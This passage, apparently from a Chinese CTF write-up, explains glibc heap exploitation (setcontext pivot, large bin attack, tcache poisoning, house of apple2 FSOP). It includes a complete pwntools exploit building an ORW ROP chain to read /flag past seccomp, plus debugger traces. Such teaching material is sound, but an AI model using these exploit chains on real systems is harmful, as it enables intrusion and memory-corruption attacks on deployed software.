&lt;setcontext+87&gt;:mov    r14,QWORD PTR [rdx+0x58]<br>   0x7f0efe05608b &lt;setcontext+91&gt;:mov    r15,QWORD PTR [rdx+0x60]<br>   <br>   0x7f0efe05608f &lt;setcontext+95&gt;:test   DWORD PTR fs:0x48,0x2<br>   0x7f0efe05609b &lt;setcontext+107&gt;:je     0x7f0efe056156 &lt;setcontext+294&gt;<br>   <br>   0x7f0efe0560a1 &lt;setcontext+113&gt;:mov    rsi,QWORD PTR [rdx+0x3a8]<br>   0x7f0efe0560a8 &lt;setcontext+120&gt;:mov    rdi,rsi<br>   0x7f0efe0560ab &lt;setcontext+123&gt;:mov    rcx,QWORD PTR [rdx+0x3b0]<br>   <br>   0x7f0efe0560b2 &lt;setcontext+130&gt;:cmp    rcx,QWORD PTR fs:0x78<br>   0x7f0efe0560bb &lt;setcontext+139&gt;:je     0x7f0efe0560f5 &lt;setcontext+197&gt;<br></code></pre></td></tr></table></figure><p><strong>通过magic_gadget控制rdx，堆块地址为rdi+8</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">$ ROPgadget --binary ./libc-2.32.so --only &#x27;mov|call&#x27;| grep &#x27;rdx&#x27;<br><br>0x000000000014b760 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]<br></code></pre></td></tr></table></figure><p>只需要将free_hook指向magic_gadge，同时布置堆块</p><p>在<code>rdi + 8</code>指向的堆块中布局好参数（<strong>堆块偏移0x20处写入setcontext+61的地址， 0xa0处写入栈迁移的目标位置</strong>）</p><p>要注意的是在setcontext返回之前有一个<code>push rcx</code>的操作，因此ROP链的第一个返回地址要写在<code>rdx + 0xa8</code>所指向的位置。</p><h4 id="怎么布置堆块"><a href="#怎么布置堆块" class="headerlink" title="怎么布置堆块"></a><strong>怎么布置堆块</strong></h4><p><strong>先将free_hook改为magic_gadget</strong></p><p>再申请两个chunk，chunk1和chunk2</p><p>在chunk2上输入orw链</p><p>布置chunk1，最后free(chunk1)</p><p><img src="/../md/18.png" alt="在这里插入图片描述"></p><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p><strong>思路同步上一题，最后tcache poisioning时变为栈劫持，进行ORW</strong></p><ol><li><strong>leak libc_base &amp; heap_base</strong></li><li><strong>large bin attack打mp_.tcache_bins</strong></li><li><strong>tcache poinsion打free_hook</strong></li><li><strong>setcontext + ORW</strong></li></ol><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><p><strong>沙盒</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./vuln<br> line  CODE  JT   JF      K<br>=================================<br> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number<br> 0001: 0x35 0x03 0x00 0x40000000  if (A &gt;= 0x40000000) goto 0005<br> 0002: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0005<br> 0003: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0005<br> 0004: 0x06 0x00 0x00 0x7fff0000  return ALLOW<br> 0005: 0x06 0x00 0x00 0x00000000  return KILL<br></code></pre></td></tr></table></figure><p>加了沙箱，不能execve和system</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.32.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./vuln&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><br><span class="hljs-comment">#------------------------ MENU  ----------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>ru(<span class="hljs-string">&#x27;&gt;&#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>menu(<span class="hljs-number">1</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Size: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, con=p64(<span class="hljs-params"><span class="hljs-number">0xdeadbeef</span></span>)</span>):<br>menu(<span class="hljs-number">3</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br>ru(<span class="hljs-string">&#x27;Content: &#x27;</span>)<br>s(con)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>menu(<span class="hljs-number">4</span>)<br>ru(<span class="hljs-string">&#x27;Index: &#x27;</span>)<br>sl(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#------------------------ 1.heap &amp; libc  ----------------------</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">1360</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">1360</span>)<br><span class="hljs-comment">#edit(1, &#x27;&#x27;)</span><br>free(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">1280</span>)<br><br>show(<span class="hljs-number">2</span>)<br>malloc_hook = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">1184</span> - <span class="hljs-number">0x10</span><br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">15</span> + <span class="hljs-string">b&quot;b&quot;</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span> ,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span> <br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>)<br><br><br><span class="hljs-comment">#---------------------- 2. large bin attack ----------------- </span><br>mp = libc_base + <span class="hljs-number">0x1E32D0</span> <span class="hljs-comment">#pwndbg&gt; print &amp;mp_.tcache_bins</span><br>lg(<span class="hljs-string">&#x27;mp&#x27;</span>)<br><br><span class="hljs-comment">#largebin</span><br>add(<span class="hljs-number">3</span>, <span class="hljs-number">1568</span>) <span class="hljs-comment">#0x620,UAF -&gt; large bin</span><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">1296</span>) <span class="hljs-comment">#fen</span><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">1552</span>) <span class="hljs-comment">#0x610</span><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">1296</span>) <span class="hljs-comment">#fen,0x510</span><br><br>free(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">7</span>, <span class="hljs-number">1584</span>) <span class="hljs-comment">#0x630</span><br><br>free(<span class="hljs-number">5</span>)<br><br><span class="hljs-comment">#keep the large_bin_chunk</span><br><span class="hljs-comment">#fake_bk_nextsize</span><br>fd = libc_base + <span class="hljs-number">0x1E4070</span><br>bk = libc_base + <span class="hljs-number">0x1E4070</span><br>fd_nextsize = heap_base + <span class="hljs-number">0xCB0</span><br>edit(<span class="hljs-number">3</span>, p64(fd)+p64(bk)+p64(fd_nextsize)+p64(mp-<span class="hljs-number">0x20</span>) ) <br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">1584</span>)<span class="hljs-comment">#ATTACK</span><br><br><span class="hljs-comment">#------------------------ 3.tcache poisioning  ----------------------------</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>lg(<span class="hljs-string">&#x27;free_hook&#x27;</span>)<br><br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">6</span>)  <span class="hljs-comment">#6 --&gt; 4</span><br>key = (heap_base+<span class="hljs-number">0x1EC0</span>) &gt;&gt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;key&#x27;</span>)<br><br>edit(<span class="hljs-number">6</span>, p64(free_hook ^ key)) <span class="hljs-comment">#4 -&gt; free_hook</span><br><br><span class="hljs-comment">#------------------------ 4.Gadget  ----------------------------</span><br><span class="hljs-comment">#gadget</span><br>Magic_gadget = libc_base + <span class="hljs-number">0x14b760</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x45580</span><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x19223f</span><br>pop_rdx_r12_ret = libc_base + <span class="hljs-number">0x114161</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x2ac3f</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0611ea</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span> <span class="hljs-comment">#why??</span><br><br>setcontext_61 = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span><br>fake_stack =  heap_base + <span class="hljs-number">0x800</span> <span class="hljs-comment">#chunk1</span><br><br>chunk7_addr = heap_base + <span class="hljs-number">0x23E0</span><br>chunk8_addr = heap_base + <span class="hljs-number">0x2A20</span><br><br><br><span class="hljs-comment">#orw: assembly at the first </span><br>orw = p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_rdi_ret) + p64(fake_stack) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rdx_r12_ret) + p64(<span class="hljs-number">0x100</span>)*<span class="hljs-number">2</span> + p64(pop_rsi_ret) + p64(fake_stack) + p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall_ret)<br>orw += p64(pop_rdi_ret) + p64(<span class="hljs-number">1</span>) + p64(libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br><br><span class="hljs-comment">#------------------------ 5. setcontext + ORW  ----------------------------</span><br><span class="hljs-comment">#1.set free_hook to magic_gadget</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">1296</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">1296</span>)<br>edit(<span class="hljs-number">10</span>, p64(Magic_gadget))<br><br><br><span class="hljs-comment">#2. setcontext</span><br><span class="hljs-comment">#chunk1</span><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;/flag\x00\x00\x00&#x27;</span>)<br><br><span class="hljs-comment">#chunk7 &amp; chunk8</span><br>edit(<span class="hljs-number">7</span>, p64(<span class="hljs-number">0</span>)+p64(chunk7_addr+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(setcontext_61)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0xf</span>+p64(chunk8_addr+<span class="hljs-number">0x10</span>)+p64(ret))<br>edit(<span class="hljs-number">8</span>, orw )<br><br>free(<span class="hljs-number">7</span>)<br><span class="hljs-comment">#</span><br><br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="11-without-hook"><a href="#11-without-hook" class="headerlink" title="11.without_hook"></a>11.without_hook</h2><p><strong>远端为Ubuntu GLIBC 2.36-0ubuntu2</strong></p><p><strong>复现用的是glibc2.35-0ubuntu3.1_amd64</strong></p><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p><strong>沙箱</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns">$ seccomp-tools dump ./vuln<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">A</span> = sys_number<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x35 0x03</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x40000000</span>  if (<span class="hljs-keyword">A</span> &gt;= <span class="hljs-number">0x40000000</span>) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x15 0x02</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x0000003b  if (<span class="hljs-keyword">A</span> == execve) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15 0x01</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000142</span>  if (<span class="hljs-keyword">A</span> == execveat) goto <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0</span>x7fff0000  return ALLOW<br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x06 0x00</span> <span class="hljs-number">0</span>x00 <span class="hljs-number">0x00000000</span>  return KILL<br></code></pre></td></tr></table></figure><p><strong>菜单，增删改查</strong></p><p>large_note那套模板</p><p><strong>add：[0x500 - 0x900]</strong></p><p><strong>free：UAF</strong></p><p><strong>edit：改内容</strong></p><p><strong>show：泄露</strong></p><p><strong>exit: 退出，执行IO流</strong></p><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p><strong>打链子house of apple2</strong></p><p><strong>条件：</strong></p><ul><li>已知<code>heap</code>地址和<code>glibc</code>地址</li><li>能控制程序执行<code>IO</code>操作，包括但不限于：从<code>main</code>函数返回、调用<code>exit</code>函数、通过<code>__malloc_assert</code>触发</li><li>能控制<code>_IO_FILE</code>的<code>vtable</code>和<code>_wide_data</code>，一般使用<code>largebin attack</code>去控制</li></ul><p><strong>流程</strong></p><ol><li><strong>泄露heap和libc地址</strong></li><li><code>Large bin attack</code> 劫持 <code>_IO_list_all</code>，将其值改为<strong>large bin chunk</strong>的头指针</li><li>利用<strong>FSOP</strong>的手法，<strong>在堆A:large bin处</strong>，<strong>伪造</strong><code>_IO_FILE_plus结构体</code>，其**_wide_data处<strong>地址指向</strong>可控堆B**</li><li>找到<strong>magic_gadget</strong>，可以进而通过rdx控制各个寄存器的值，注意其中的rcx寄存器</li><li><strong>在堆B处</strong>，布置fake_wide_data，其</li><li>布置堆块，使其能通过<code>setcontxt+61</code>，触发在<strong>可控堆C</strong>处的ORW链</li><li><strong>通过exit函数，触发IO流</strong></li></ol><h3 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a><strong>触发流程</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">_IO_wfile_overflow</span><br><span class="hljs-string">    _IO_wdoallocbuf</span><br><span class="hljs-string">        _IO_WDOALLOCATE</span><br><span class="hljs-string">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br><span class="hljs-string">                magic_gadget</span><br><span class="hljs-string">                    setcontext+61</span><br><span class="hljs-string">                        orw</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunk5fake_IO_FILE_plus:</span><br><span class="hljs-string">flag = ~(2 | 0x8 | 0x800)</span><br><span class="hljs-string">vtable = _IO_wfile_jumps</span><br><span class="hljs-string">_wide_data = chunkA  (fake_wide_data)</span><br><span class="hljs-string">_IO_write_end -&gt; magic_gadget</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkA-----&gt;_wide_data:</span><br><span class="hljs-string">_IO_write_base = 0</span><br><span class="hljs-string">_IO_buf_base = 0</span><br><span class="hljs-string">_wide_vtable = chunkB (doallocate_addr)</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkA+0xE0-----&gt;_wide_vtable:</span><br><span class="hljs-string">doallocate = chunkB (setcontext+orw)</span><br><span class="hljs-string"></span><br><span class="hljs-string">chunkB----&gt;Magic+ setcontext_61 + orw</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p><code>_IO_list_all+0x88: _chain</code>   —-&gt;   <code>chunkA: fake_IO_FILE_plus</code>   —&gt;   <code>chunkB: _wide_data</code>               </p><p>​l——&gt;  <code>chunkC: setcontext+orw </code>  &lt;—-l</p><h4 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h4><p><img src="/../md/19.png" alt="在这里插入图片描述"></p><h3 id="调试-1"><a href="#调试-1" class="headerlink" title="调试"></a><strong>调试</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs assembly">► 0x5605f6b4083e &lt;main+174&gt;    call   exit@plt                &lt;exit@plt&gt;<br>&gt; si<br><br>► 0x7ff742c3af8b &lt;exit+27&gt;      call   __run_exit_handlers                &lt;__run_exit_handlers&gt;<br>&gt; si<br><br> ► 0x7fa7d8354ec0 &lt;__run_exit_handlers+448&gt;    call   qword ptr [rbx]               &lt;_IO_cleanup&gt;<br>&gt; si<br><br>► 0x7fa7d8396df4 &lt;_IO_cleanup+20&gt;    call   _IO_flush_all_lockp                &lt;_IO_flush_all_lockp&gt;<br>&gt; si<br><br><br>#之后,为布置的链子<br>► 0x7fa07cfdfc6f &lt;_IO_flush_all_lockp+207&gt;    call   qword ptr [rax + 0x18]        &lt;_IO_wfile_overflow&gt;<br>        rdi: 0x55f5cd77b8a0 ◂— 0xfffff7f5<br>        rsi: 0xffffffff<br>        rdx: 0x1<br>        rcx: 0x6c0<br>&gt; si<br><br><br>► 0x7fb8e0ba5d20 &lt;_IO_wfile_overflow+544&gt;    call   _IO_wdoallocbuf                &lt;_IO_wdoallocbuf&gt;<br>        rdi: 0x557e9eedf8a0 ◂— 0xfffff7f5<br>        rsi: 0xffffffff<br>        rdx: 0xfffff7f5<br>        rcx: 0x6c0<br>&gt; si<br><br><br>###chunkB<br>► 0x7fe7953a66e8 &lt;_IO_wdoallocbuf+40&gt;    call   qword ptr [rax + 0x68]<br>&gt; si<br><br>  0x7fe79542683b &lt;__spawni_child+1387&gt;    mov    rdx, qword ptr [rax + 0xb0]<br>► 0x7fe795426842 &lt;__spawni_child+1394&gt;    call   qword ptr [rax + 0x88]        &lt;setcontext+61&gt;<br>&gt; si<br><br><br>   0x7fe79537abdd &lt;setcontext+61&gt;     mov    rsp, qword ptr [rdx + 0xa0]<br>   0x7fe79537abe4 &lt;setcontext+68&gt;     mov    rbx, qword ptr [rdx + 0x80]<br>   0x7fe79537abeb &lt;setcontext+75&gt;     mov    rbp, qword ptr [rdx + 0x78]<br>   0x7fe79537abef &lt;setcontext+79&gt;     mov    r12, qword ptr [rdx + 0x48]<br>   0x7fe79537abf3 &lt;setcontext+83&gt;     mov    r13, qword ptr [rdx + 0x50]<br>   0x7fe79537abf7 &lt;setcontext+87&gt;     mov    r14, qword ptr [rdx + 0x58]<br>   0x7fe79537abfb &lt;setcontext+91&gt;     mov    r15, qword ptr [rdx + 0x60]<br>   0x7fe79537abff &lt;setcontext+95&gt;     test   dword ptr fs:[0x48], 2<br>   0x7fe79537ac0b &lt;setcontext+107&gt;    je     setcontext+294                &lt;setcontext+294&gt;<br>    ↓<br>   0x7fe79537acc6 &lt;setcontext+294&gt;    mov    rcx, qword ptr [rdx + 0xa8]<br> ► 0x7fe79537accd &lt;setcontext+301&gt;    push   rcx<br>   0x7fe79537acce &lt;setcontext+302&gt;    mov    rsi, qword ptr [rdx + 0x70]<br>   0x7fe79537acd2 &lt;setcontext+306&gt;    mov    rdi, qword ptr [rdx + 0x68]<br>   0x7fe79537acd6 &lt;setcontext+310&gt;    mov    rcx, qword ptr [rdx + 0x98]   &lt;abort+141&gt;<br>   0x7fe79537acdd &lt;setcontext+317&gt;    mov    r8, qword ptr [rdx + 0x28]<br>   0x7fe79537ace1 &lt;setcontext+321&gt;    mov    r9, qword ptr [rdx + 0x30]<br>   0x7fe79537ace5 &lt;setcontext+325&gt;    mov    rdx, qword ptr [rdx + 0x88]<br>   0x7fe79537acec &lt;setcontext+332&gt;    xor    eax, eax<br>   0x7fe79537acee &lt;setcontext+334&gt;             ret    <br>    ↓<br>   0x7fe7953567ad &lt;abort+141&gt;                  ret    <br>    ↓<br>   0x7fe795357a82 &lt;iconv+162&gt;                  pop    rdi<br>   0x7fe795357a83 &lt;iconv+163&gt;                  ret    <br>    ↓<br>   0x7fe795361bea &lt;__gconv_create_spec+650&gt;    pop    rsi<br></code></pre></td></tr></table></figure><h4 id="IO-wfile-overflow"><a href="#IO-wfile-overflow" class="headerlink" title="_IO_wfile_overflow"></a><strong>_IO_wfile_overflow</strong></h4><p><code>条件：f-&gt;_flags &amp; _IO_NO_WRITES == 0并且f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING == 0和f-&gt;_wide_data-&gt;_IO_write_base == 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 